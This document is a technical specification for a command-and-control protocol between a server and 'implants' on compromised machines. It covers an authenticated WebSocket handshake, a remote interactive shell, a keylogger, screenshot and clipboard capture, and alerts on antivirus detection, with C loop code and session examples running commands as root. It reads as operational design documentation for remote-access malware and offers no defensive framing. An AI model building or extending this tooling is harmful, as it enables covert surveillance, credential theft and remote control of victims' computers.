# C2 WebSocket Communication Protocol

> Version: `1.3.0`  
> Transport: WebSocket (`ws://` / `wss://`)  
> Encoding: UTF-8 text frames

---

## Overview

This document describes the handshake and command protocol used between implants (devices) and the C2 server. Every connection must complete a **4-stage handshake** before the device is considered active and ready to receive commands.

All messages are plain UTF-8 text. No binary frames are used.

The protocol is **fully bidirectional** after the handshake. The server sends commands (`CMD`), the client responds (`CMD_OK` / `CMD_FAIL`), and the client can push unsolicited data at any time using `EVENT`. Both directions share the same single WebSocket connection — no second connection or thread is needed.

Not every device supports every command. The server must query `CMD caps` first to know what the connected device can do before issuing commands.

---

## Message Types

| Prefix     | Direction       | Purpose                                    |
|------------|-----------------|--------------------------------------------|
| `HELLO`    | Client → Server | Stage 1 handshake — authenticate           |
| `FORMAT`   | Client → Server | Stage 2 handshake — negotiate data format  |
| `IDENT`    | Client → Server | Stage 3 handshake — identify device        |
| `CMD`      | Server → Client | Issue a command to the device              |
| `CMD_OK`   | Client → Server | Successful response to a command           |
| `CMD_FAIL` | Client → Server | Failed response to a command               |
| `EVENT`    | Client → Server | Unsolicited push — keylogger, alerts, etc. |

---

## Handshake Stages

```
CLIENT                            SERVER
  │                                 │
  │──── HELLO <ws_key> ────────────▶│  Stage 1 — Authenticate
  │◀─── HELLO_OK                ────│
  │                                 │
  │──── FORMAT <json|csv> ─────────▶│  Stage 2 — Negotiate format
  │◀─── FORMAT_OK               ────│
  │                                 │
  │──── IDENT <device_id|NEW> ─────▶│  Stage 3 — Identify device
  │◀─── IDENT_OK <device_id>    ────│
  │                                 │
  │         [ DEVICE READY ]        │
  │                                 │
  │◀─── CMD caps ───────────────────│  Server discovers capabilities
  │──── CMD_OK ping;shell;keylog ──▶│
  │                                 │
  │◀─── CMD <command> [args...] ────│  Normal command flow
  │──── CMD_OK <data>          ────▶│
  │                                 │
  │──── EVENT <type> [data] ───────▶│  Device pushes data anytime
```

If any handshake stage fails the server closes the connection immediately. The client **must not** proceed to the next stage until it receives an `_OK` response.

---

## Stage 1 — Authentication (`HELLO`)

The client proves it is a valid registered implant by sending its `ws_key`. This key is unique per compiled program and is stored in the `programs` table on the server.

**Client sends:**
```
HELLO <ws_key>
```

| Field    | Type     | Description                                  |
|----------|----------|----------------------------------------------|
| `ws_key` | `CHAR64` | SHA-256 key embedded in the implant at build |

**Server responds:**

| Response     | Meaning                              |
|--------------|--------------------------------------|
| `HELLO_OK`   | Key is valid, proceed to Stage 2     |
| `HELLO_FAIL` | Key not found or invalid, disconnect |

**Example:**
```
→ HELLO a3f8c2d1e4b79021fdc3a1b2e5f6c7d8a3f8c2d1e4b79021fdc3a1b2e5f6c7d8
← HELLO_OK
```

---

## Stage 2 — Format Negotiation (`FORMAT`)

The client declares which data format it will use for all structured messages — both `CMD_OK` responses and `EVENT` payloads. This is fixed for the lifetime of the connection.

**Client sends:**
```
FORMAT <format>
```

| Format | Description                        | Best for   |
|--------|------------------------------------|------------|
| `json` | Standard JSON encoding             | Python, JS |
| `csv`  | Semicolon-separated values         | Raw C      |

**Server responds:**

| Response      | Meaning                              |
|---------------|--------------------------------------|
| `FORMAT_OK`   | Format accepted, proceed to Stage 3  |
| `FORMAT_FAIL` | Unknown format specified, disconnect |

**Example:**
```
→ FORMAT csv
← FORMAT_OK
```

### CSV Format Specification

CSV uses `;` as the delimiter. It is designed to be trivially parsed in C with no dependencies.

**Single-row response** (one record):
```
value1;value2;value3
```

**Multi-row response** (list of records), rows separated by `\n`:
```
value1;value2;value3
value4;value5;value6
```

Rules:
- Fields separated by `;`
- Values **must not** contain `;` or `\n` — URL-encode if needed (`%3B`, `%0A`)
- Binary data must be Base64-encoded
- No headers, no quoting, no nesting
- The server knows the expected column order per command from this document

**C parsing example:**
```c
// Parse one row: "linux;x64;root;1"
char row[1024];
// ... ws_recv into row ...
char *fields[32];
int n = 0;
char *tok = strtok(row, ";");
while (tok && n < 32) {
    fields[n++] = tok;
    tok = strtok(NULL, ";");
}
// fields[0]="linux"  fields[1]="x64"  fields[2]="root"  fields[3]="1"
```

---

## Stage 3 — Device Identification (`IDENT`)

The client either presents an existing server-assigned `device_id` or requests a new one. The server **always** generates and owns device IDs — the client never creates its own.

**Client sends:**
```
IDENT <device_id|NEW>
```

| Value    | Meaning                                         |
|----------|-------------------------------------------------|
| `NEW`    | First run — request a new device ID from server |
| `<uuid>` | Reconnecting — present previously assigned ID   |

**Server responds:**

| Response          | Meaning                                          |
|-------------------|--------------------------------------------------|
| `IDENT_OK <uuid>` | ID confirmed or newly assigned, proceed to ready |
| `IDENT_FAIL`      | Unknown or mismatched ID, disconnect             |

> **Note:** If a client sends an ID that does not exist in the database (e.g. after server wipe), the server responds with `IDENT_FAIL`. The client must delete its stored ID and reconnect with `NEW`.

**Example (new device):**
```
→ IDENT NEW
← IDENT_OK 550e8400-e29b-41d4-a716-446655440000
```

**Example (reconnect):**
```
→ IDENT 550e8400-e29b-41d4-a716-446655440000
← IDENT_OK 550e8400-e29b-41d4-a716-446655440000
```

---

## Stage 4 — Command Loop

After a successful handshake the device enters the command loop. Both sides may send messages at any time on the same connection.

### Commands (Server → Client)

**Server sends:**
```
CMD <command> [arg1] [arg2] ...
```

**Client responds (success):**
```
CMD_OK <data>
```

**Client responds (failure):**
```
CMD_FAIL <reason>
```

- `<data>` is formatted according to the negotiated format (`json` or `csv`)
- `<reason>` is a single word error code (no spaces)
- If a command produces no output, respond with `CMD_OK` (no data)
- If a command is not supported by this device, respond with `CMD_FAIL unsupported`

### Events (Client → Server)

The client may send `EVENT` messages **at any time** after the handshake. The server never responds to events — they are fire-and-forget.

**Client sends:**
```
EVENT <type> <data>
```

- `<data>` is a single CSV row or Base64 blob depending on event type
- Events must not block or delay `CMD` responses — buffer and flush on a tick

**Single-connection, no threads required:**
```c
while (1) {
    ws_set_nonblocking(ws);

    char buf[65536];
    int n = ws_recv(ws, buf, sizeof(buf));   // non-blocking
    if (n > 0 && strncmp(buf, "CMD ", 4) == 0)
        handle_command(ws, buf);

    flush_event_buffer(ws);   // send buffered keystrokes, alerts, etc.

    usleep(100000);            // 100ms tick
}
```

---

## Universal Commands

These commands **must** be implemented by every device regardless of capabilities.

### `caps` — List available commands

The server always calls this first after handshake to discover what the device supports.

**Server sends:**
```
CMD caps
```

**Client responds** — semicolon-separated list of supported command names:
```
CMD_OK ping;shell;keylog_start;screenshot
```

The server must not issue any command that was not listed in `caps`.

---

### `ping` — Keepalive check

**Server sends:**
```
CMD ping
```

**Client responds:**
```
CMD_OK pong
```

---

## Shell Commands

If `shell` appears in `caps`, the device supports an interactive persistent shell. This replaces the need for most individual commands — use the shell to run `ls`, `ps`, `ifconfig`, etc. yourself.

A shell session has a lifecycle: **open → write → read → kill**.

### `shell_open` — Spawn a shell process

**Server sends:**
```
CMD shell_open
```

**Client responds:**
```
CMD_OK
```

- Only one shell is active per connection at a time
- The shell stays alive until `shell_kill` is sent or the connection drops

### `shell_write` — Send input to shell

**Server sends:**
```
CMD shell_write <b64_input>
```

- `<b64_input>` is Base64-encoded stdin to write to the shell (include `\n` to execute)

**Client responds:**
```
CMD_OK
```

### `shell_read` — Read pending output

**Server sends:**
```
CMD shell_read
```

**Client responds** with Base64-encoded stdout/stderr since last read:
```
CMD_OK <b64_output>
```

- Returns `CMD_OK` with empty data if no output is pending
- Output is not buffered indefinitely — read frequently

### `shell_kill` — Terminate shell

**Server sends:**
```
CMD shell_kill
```

**Client responds:**
```
CMD_OK
```

**Shell session example:**
```
← CMD shell_open
→ CMD_OK

← CMD shell_write aWQK                    # "id\n" in base64
→ CMD_OK

← CMD shell_read
→ CMD_OK dWlkPTAocm9vdCkgZ2lkPTAocm9vdCk=   # "uid=0(root) gid=0(root)"

← CMD shell_write bHMgLWxhIC9ldGMK       # "ls -la /etc\n"
→ CMD_OK

← CMD shell_read
→ CMD_OK <base64 of ls output>

← CMD shell_kill
→ CMD_OK
```

---

## Collection Commands

These commands toggle ongoing background collection. Collected data is pushed back to the server via `EVENT` automatically.

### `keylog_start` — Start keylogger

**Server sends:**
```
CMD keylog_start <interval_sec>
```

- `<interval_sec>` — how often to flush buffered keystrokes as an `EVENT`
- Use `0` to send each keystroke immediately as it is captured with no buffering

**Client responds:**
```
CMD_OK
```

### `keylog_stop` — Stop keylogger

```
CMD keylog_stop
→ CMD_OK
```

### `screenshot` — One-shot screen capture

**Server sends:**
```
CMD screenshot
```

**Client responds** with Base64-encoded PNG:
```
CMD_OK <b64_png>
```

---

## Supported Events

Events are pushed by the client at any time after handshake. The server never acknowledges them.

| Event type   | Data format (CSV columns) | Description                      |
|--------------|---------------------------|----------------------------------|
| `keylog`     | `<b64_keystrokes>`        | Buffered keystrokes              |
| `screenshot` | `<b64_png>`               | Periodic screen capture          |
| `clipboard`  | `<b64_text>`              | Clipboard contents changed       |
| `alert`      | `<level>;<message>`       | Device-side alert (low/med/high) |

**Examples:**
```
→ EVENT keylog SGVsbG8gV29ybGQ=
→ EVENT alert high;antivirus_process_detected
→ EVENT clipboard aGVsbG8gd29ybGQ=
```

---

## Error Codes

| Code                | Meaning                                     |
|---------------------|---------------------------------------------|
| `unknown_command`   | Command not recognized                      |
| `invalid_args`      | Wrong number or type of arguments           |
| `permission_denied` | Insufficient privileges on the device       |
| `not_found`         | Target resource not found                    |
| `timeout`           | Command exceeded time limit                 |
| `unsupported`       | Not listed in this device's `caps`          |
| `internal_error`    | Unexpected error during execution           |

---

## Full Session Example (CSV client)

```
→ HELLO d8f3a1c2b4e5f6a7d8f3a1c2b4e5f6a7d8f3a1c2b4e5f6a7d8f3a1c2b4e5f6a7
← HELLO_OK

→ FORMAT csv
← FORMAT_OK

→ IDENT NEW
← IDENT_OK 550e8400-e29b-41d4-a716-446655440000

← CMD caps
→ CMD_OK ping;shell_open;shell_write;shell_read;shell_kill;keylog_start;keylog_stop;screenshot

← CMD ping
→ CMD_OK pong

← CMD shell_open
→ CMD_OK

← CMD shell_write dW5hbWUgLWEK        # "uname -a\n"
→ CMD_OK

← CMD shell_read
→ CMD_OK TGludXggdWJ1bnR1IDYuMS4wLXJvb3Q=  # "Linux ubuntu 6.1.0-root"

← CMD keylog_start 10
→ CMD_OK

  [10 seconds pass]

→ EVENT keylog cm9vdEBzZXJ2ZXI6fiMgc3U=

← CMD screenshot
→ CMD_OK iVBORw0KGgoAAAANSUhEUgAA...

→ EVENT alert high;new_user_logged_in

← CMD shell_kill
→ CMD_OK
```

---

## Security Notes

- `ws_key` is a per-build secret — embed at compile time, never hardcode in source
- Always use `wss://` (TLS) in production — never plain `ws://` over the internet
- Device IDs are UUIDs generated server-side — clients never self-assign
- The server must call `caps` before issuing any optional command
- `EVENT` payloads are stored raw — sanitize before rendering in any admin UI
- Set a maximum WebSocket frame size on the server to limit oversized Base64 payloads
- Connections that fail any handshake stage are dropped with no explanation beyond `_FAIL`